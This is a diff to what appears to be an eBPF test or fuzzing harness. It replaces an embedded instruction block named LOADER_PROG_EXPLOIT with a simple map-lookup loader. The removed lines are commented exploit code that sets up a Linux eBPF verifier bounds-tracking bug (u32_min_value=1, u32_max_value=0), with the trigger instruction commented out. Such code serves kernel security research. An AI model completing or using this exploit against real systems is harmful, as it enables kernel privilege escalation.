@@ -255,45 +255,29 @@ STx -> ran(REG) , imm = 0
 '''
 
 
-LOADER_PROG_EXPLOIT = '''
-		// Load 0 into R0
+LOADER_PROG_MAP_LOOKUP = '''
+		// Call helper function map_lookup_elem. First parameter is in R1 // (map pointer).
 		BPF_MOV64_IMM(BPF_REG_0, 0),  // R0 = 0
-		// Store value of R0=0 at stack_ptr-4.
 		BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
-		// Set R2= stack_ptr-4
 		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10 ),
 		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
 		BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),
-
-		// Call helper function map_lookup_elem. First parameter is in R1 // (map pointer).
-		// Second parameter is in R2, (ptr to elem index   // value).  *(word*)(stack_ptr-4) = 0
 		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
-
-		// Verify the results
 		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
 		BPF_EXIT_INSN(),
-
 		/* store the map value pointer into designated register */
 		BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),
 		BPF_MOV32_IMM(BPF_REG_0, 0),
 		BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_2, 0),
 
-		/* load "unknown" value into exploit register so it begins with a tnum mask of 0xFFFFFFFFFFFFFFFF */ \
+		/*REG_4 with a tnum mask of 0xFFFFFFFFFFFFFFFF */ \
 		BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),
-		BPF_MOV32_IMM(BPF_REG_5, 0xFFFFFFFF),
-		/* constant register value is 0xFFFFFFFF00000000 */
-		BPF_ALU64_IMM(BPF_LSH, BPF_REG_5, 32),
-		/* exploit register has tnum mask of 0xFFFFFFFF00000000 since now the bottom 32 bits are known to be 0 */
-		BPF_ALU64_REG(BPF_AND,BPF_REG_4 , BPF_REG_5),
-		/* exploit register has tnum value 0x1 and mask of 0xFFFFFFFF00000000 */
-		BPF_ALU64_IMM(BPF_ADD,BPF_REG_4 , 1),
-		/* constant register value is 0x1 */
-		BPF_MOV64_IMM(BPF_REG_5, 0x1),
-		/* constant register value is 0x100000000 */
-		BPF_ALU64_IMM(BPF_LSH, BPF_REG_5, 32),
-		/* constant register value is 0x100000002 */
-		BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 2),
-		/* trigger the bug, exploit register has u32_min_value=1,u32_max_value=0 */
-//		BPF_ALU64_REG(BPF_AND,BPF_REG_4 , BPF_REG_5),
-//              BPF_EXIT_INSN(),
+                /*Initialize the registers*/
+		BPF_MOV32_IMM(BPF_REG_5, 0),
+		BPF_MOV32_IMM(BPF_REG_6, 0),
+		BPF_MOV32_IMM(BPF_REG_7, 0),
+		BPF_MOV32_IMM(BPF_REG_8, 0),
+		BPF_MOV32_IMM(BPF_REG_9, 0),
+
+
 '''
